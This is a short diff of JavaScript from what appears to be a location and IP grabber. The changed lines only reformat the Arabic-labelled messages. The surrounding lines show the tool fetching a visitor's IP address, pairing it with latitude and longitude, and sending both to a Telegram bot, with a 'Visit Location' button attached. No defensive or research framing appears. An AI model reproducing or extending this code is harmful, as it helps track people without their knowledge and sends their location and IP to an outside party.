@@ -27,7 +27,7 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `الموقع: \n${latitude} ${longitude}\nالايبي: ==> ${ipAddress}`;
+    const message = `\nالموقع: \n${latitude} ${longitude}\nالايبي: \n${ipAddress}`;
 
 
     // Create the inline keyboard markup with the "Visit Location" button
@@ -64,7 +64,7 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `الايبي ==> ${ipAddress}`;
+    const message = `الايبي:\n ${ipAddress}`;
 
     // Send IP result to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
